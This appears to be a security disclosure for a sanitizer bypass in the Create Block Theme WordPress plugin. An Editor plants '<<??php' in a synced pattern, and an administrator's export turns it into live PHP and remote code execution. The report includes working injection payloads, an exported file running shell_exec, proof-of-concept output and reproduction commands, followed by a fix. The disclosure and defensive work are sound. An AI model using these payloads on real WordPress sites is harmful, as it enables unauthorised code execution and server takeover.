# Create Block Theme — `strip_php_tags()` bypass gives **Editor → RCE** privilege escalation

**Plugin:** Create Block Theme (WordPress.org, in scope — officially maintained)
**Version:** 2.10.1 (current `Stable tag`), source `github.com/WordPress/create-block-theme` @ `5524f19`
**File:** `includes/create-theme/theme-patterns.php` — `CBT_Theme_Patterns::strip_php_tags()`
**Class:** CWE-94 / CWE-95 — sanitizer bypass → PHP code injection into generated `.php`
**Attacker role:** **Editor** (no `edit_themes`, no `install_plugins`, cannot execute PHP)
**Verified:** end-to-end on WordPress 7.1 / PHP 8.4.19 — `RCE uid=0` through the real exporter.

> **Correction to my first draft.** I initially scoped this as "admin-gated defence-in-depth,"
> reasoning that only an administrator could get an unmangled payload past kses. That was wrong:
> on single-site WordPress the **Editor** role also holds `unfiltered_html`. An Editor cannot
> write theme files, install plugins, or execute PHP — but they *can* plant the payload, and a
> routine administrator export turns it into code execution. This is a privilege escalation, and
> the severity below is revised accordingly.

## TL;DR

`strip_php_tags()` strips PHP open tags from user-supplied pattern bodies with a **single,
non-recursive** `preg_replace('/<\?/', '', $content)`. Removing an *inner* `<?` lets the
surrounding bytes **recombine** into a fresh tag:

```
<<??php  →  (the <? at offset 1–2 is deleted)  →  <?php
```

An Editor stores `<<??php … ?>` in a **synced pattern** (`wp_block`) — ordinary content authoring.
When an administrator later runs Create Block Theme's export/save, `add_patterns_to_theme()`
reads **every** `wp_block` post, runs it through the bypassable sanitizer, and writes
`wp-content/themes/<active>/patterns/<name>.php`. Block themes `require` every `patterns/*.php`
at init (`_register_theme_block_patterns()`), so the injected PHP executes on page load.

## Why this crosses a privilege boundary

WordPress deliberately separates "may inject HTML/JS" from "may execute server-side PHP" — that
separation is the reason `edit_themes`, `edit_plugins`, `install_plugins` and `DISALLOW_FILE_EDIT`
exist. `unfiltered_html` grants the former, never the latter. Measured on the live install:

```
editor_has_edit_themes:      no   <-- cannot write theme files
editor_has_install_plugins:  no
editor_has_unfiltered_html:  YES  <-- payload survives kses intact
```

The Editor never touches the filesystem. The administrator's export is a normal, expected action
and gives no indication that a stored pattern contains PHP — the plugin's own sanitizer exists
precisely to guarantee it cannot.

*Scope note:* on **multisite**, `unfiltered_html` is restricted to super admins, so the Editor
vector does not apply there; this is a single-site escalation.

## Root cause

```php
public static function strip_php_tags( $content ) {
    if ( ! is_string( $content ) || '' === $content ) {
        return $content;
    }
    $content = preg_replace( '/<\?/', '', $content );   // single pass — recombinable
    $content = preg_replace( '#<script\s+language\s*=\s*["\']?php["\']?[^>]*>.*?</script>#is', '', $content );
    return $content;
}
```

`preg_replace` removes all *non-overlapping* matches in one left-to-right pass and never re-scans
its own output. In `<<??php` the only match is the `<?` at offset 1; deleting it joins the leading
`<` to `?php`. `<<??=` likewise yields `<?=`.

Both export paths funnel through this one function: `pattern_from_wp_block()` (synced patterns)
and `CBT_Theme_Templates::prepare_template_for_export()` (templates and parts).

## Proof

### Step 0 — the sanitizer bypass, standalone (`poc/t_stripbypass.php`)

```
recombine <<??php      in=<<??php system("id"); ?>     out=<?php system("id"); ?>       *** PHP TAG SURVIVES ***
short     <<??=        in=<<??= `id` ?>                out=<?= `id` ?>                  *** PHP TAG SURVIVES ***
plain     <?php        in=<?php system("id"); ?>       out=php system("id"); ?>         clean
```

### Steps 1–3 — full chain via the **real** exporter (`poc/t_cbt_realpath.php`)

Editor plants the pattern through the stock `POST /wp/v2/blocks` endpoint; the administrator then
calls the genuine entry point `CBT_Theme_Patterns::add_patterns_to_theme()`:

```
editor_block_id: 1056
file_created: YES
has_live_php_tag: *** YES ***
RCE_VIA_REAL_EXPORT: *** RCE uid=0 ***
```

The written file (`poc/t_cbt_editor_rce.php` shows it in full):

```php
<?php
/**
 * Title: cbt-editor
 * Slug: twentytwentyfive/cbt-editor
 * Categories:
 */
?>
<?php file_put_contents("…/CBT_EDITOR_RCE.txt", "RCE as uid=".trim(shell_exec("id -u"))." via editor-planted pattern"); ?>
```

The `<<??php` in the Editor's stored pattern became a live `<?php` in the exported theme and ran.

### Roles measured (`poc/t_cbt_contrib.php`)

| role | `unfiltered_html` | can create `wp_block` | payload survives |
|---|---|---|---|
| Contributor | no | **no** (403 `rest_cannot_create`) | — |
| Author | no | yes (201) | no — kses mangles `<<??php` to `&lt;` |
| **Editor** | **YES** | yes (201) | **YES — stored byte-for-byte** |

Editor is the minimum role. Author and Contributor cannot reach it, because kses escapes every
literal `<` and no `<?` sequence survives it.

## Severity

**High.** Authenticated Editor → remote code execution as the web-server user, via an action the
administrator is expected to perform. It requires a second actor (the admin export), which is the
only thing keeping it from Critical — but that action is routine and the plugin's entire purpose.
It defeats a control the maintainers wrote specifically to prevent PHP from reaching exported
files, and it is not mitigated by `DISALLOW_FILE_EDIT` / `DISALLOW_FILE_MODS` from the Editor's
side (the Editor never needed file permissions; the admin already has them).

## Fix

Make the strip idempotent — repeat to a fixed point, so no recombination can survive:

```php
do {
    $prev    = $content;
    $content = preg_replace( '/<\?/', '', $content );
} while ( $content !== $prev );
```

Verified: `<<??php system(1);?>` → `php system(1);?>`, `<<??=` → `=`, `<<??<??php x` → `?php x` —
no `<?` remains. The `<script language="php">` pass needs the same loop. Stronger still, since a
pattern body legitimately contains no raw `<?`, reject or HTML-encode `<` outright.

## Reproduce

```
php poc/t_stripbypass.php                                   # sanitizer bypass, no WordPress needed
# with the plugin active and a block theme active:
wp eval-file poc/t_cbt_contrib.php    --allow-root          # role matrix
wp eval-file poc/t_cbt_realpath.php   --allow-root          # -> RCE_VIA_REAL_EXPORT: *** RCE uid=0 ***
```
